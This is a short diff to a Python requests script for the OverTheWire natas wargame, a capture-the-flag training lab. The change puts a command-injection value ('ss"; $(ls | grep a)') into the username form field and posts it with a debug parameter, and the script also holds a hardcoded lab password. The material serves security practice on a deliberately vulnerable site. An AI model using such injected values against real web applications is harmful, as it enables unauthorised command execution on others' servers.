@@ -7,8 +7,9 @@ password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
 url = 'http://%s.natas.labs.overthewire.org/' % user
 
 sessione = requests.Session()
-obj = {'username': 'natas18'}
-get = sessione.get(url, data=obj, auth=(user, password))
+obj = {'username': 'ss\"; $(ls | grep a)'}
+get = sessione.post(url, params={'debug': '1', 'aa': '2'},
+                    auth=(user, password), data=obj)
 
 print(get.text)
 
